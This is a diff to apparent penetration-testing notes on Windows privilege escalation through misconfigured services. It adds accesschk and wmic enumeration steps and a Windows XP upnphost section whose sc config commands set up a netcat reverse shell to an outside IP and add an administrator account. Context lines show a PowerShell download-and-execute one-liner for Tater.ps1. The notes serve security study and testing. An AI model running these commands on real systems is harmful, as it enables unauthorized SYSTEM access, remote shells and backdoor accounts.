@@ -556,19 +556,22 @@ The `accesschk` tool, from the `Sysinternals` suite, and the `Powershell`
 `PowerUp` script can be used to list the services an user can exploit:
 
 ```
-# Shows which services can be altered by the specified user
-accesschk.exe -accepteula -uwcqv <USERNAME> *
-accesschk64.exe -accepteula -uwcqv <USERNAME> *
-
-# Shows which services can be altered by everyone
+# List services that configure permissions for the "Everyone" / "Tout le monde" user groups
 accesschk.exe -accepteula -uwcqv "Everyone" *
 accesschk64.exe -accepteula -uwcqv "Everyone" *
 accesschk.exe -accepteula -uwcqv "Tout le monde" *
 accesschk64.exe -accepteula -uwcqv "Tout le monde" *
 
-# Shows groups which can alter the service
+# List services that configure permissions for the specified user
+accesschk.exe -accepteula -uwcqv <USERNAME> *
+accesschk64.exe -accepteula -uwcqv <USERNAME> *
+
+# Enumerate all services and their permissions configuration
 accesschk.exe -accepteula -uwcqv *
 accesschk64.exe -accepteula -uwcqv *
+
+# Retrieve permissions configuration for the specified service
+accesschk64.exe -accepteula -uwcqv <SERVICE_NAME>
 
 # (PowerShell) PowerSploit's PowerUp Get-ModifiableServiceFile & Get-ModifiableService
 # Get-ModifiableServiceFile - returns services for which the current user can directly modify the binary file
@@ -584,7 +587,8 @@ meterpreter> powershell_execute Get-ModifiableServiceFile
 meterpreter> powershell_execute Get-ModifiableService
 ```
 
-The exploitable permissions are:
+The following permissions allow for the modification of the service
+`BINARY_PATH_NAME` parameter:
 
 ```
 SERVICE_CHANGE_CONFIG
@@ -618,6 +622,13 @@ AUTHORITY\SYSTEM privileges.
 
 Permissive NTFS permissions on the service binary used by the service can be
 leveraged to elevate privileges on the system as the user running the service.
+
+If available, the Windows utility `wmic` can be used to retrieve all services
+binary paths:
+
+```
+wmic service list full | findstr /i "PathName" | findstr /i /v "System32"
+```
 
 The Windows bullet-in `icacls` can be used to determine the NTFS permissions on
 the services binary:
@@ -683,7 +694,31 @@ through an existing `meterpreter` session to automatically detect and exploit
 unquoted service path to execute a specified payload under `NT AUTHORITY\SYSTEM`
 privileges.
 
-###### Misc
+######  Windows XP SP0 & SP1
+
+On Windows XP SP0 and SP1, the Windows service `upnphost` is run by
+`NT AUTHORITY\LocalService` and grants the permission `SERVICE_ALL_ACCESS` to
+all `Authenticated Users`, meaning all authenticated users on the system can
+fully modify the service configuration. Du to the End-of-Life status of the
+Service Pack affected, the vulnerability will not be fixed and can be used as
+an universal privileges escalation method on Windows XP SP0 & SP1.  
+
+```
+# accesschk.exe -uwcqv "Authenticated Users" *
+# RW upnphost SERVICE_ALL_ACCESS
+# sc qc upnphost
+# SERVICE_START_NAME : NT AUTHORITY\LocalService
+
+sc config upnphost binpath= "C:\<NC.EXE> -e C:\WINDOWS\System32\cmd.exe <IP> <PORT>"
+sc config upnphost binpath= "net user <USERNAME> <PASSWORD> /add && net localgroup Administrators <USERNAME> /add"
+sc config upnphost obj= ".\LocalSystem" password= ""
+sc config upnphost depend= ""
+
+net stop upnphost
+net start upnphost
+```
+
+###### Generate new service binary
 
 *Add a local administrator user*
 
@@ -708,7 +743,7 @@ The C code above can be compiled on Linux using the  cross-compiler `mingw`
 The service can be leveraged to start a privileged reverse shell. Refer to the
 `[General] Shells - Binary` note.  
 
-*Service restart*
+####### Service restart
 
 To restart the service:
 
@@ -848,7 +883,7 @@ Invoke-Tater -Command "net user <USERNAME> <PASSWORD> /add && net localgroup adm
 powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Tater.ps1'); Invoke-Tater -Command <POWERSHELLCMD>;
 ```
 
-### Windows Subsystem for Linux (WSL)
+### Windows Subsystem for Linux (WSL) - TODO
 
 Windows Subsystem for Linux
 Introduced in Windows 10
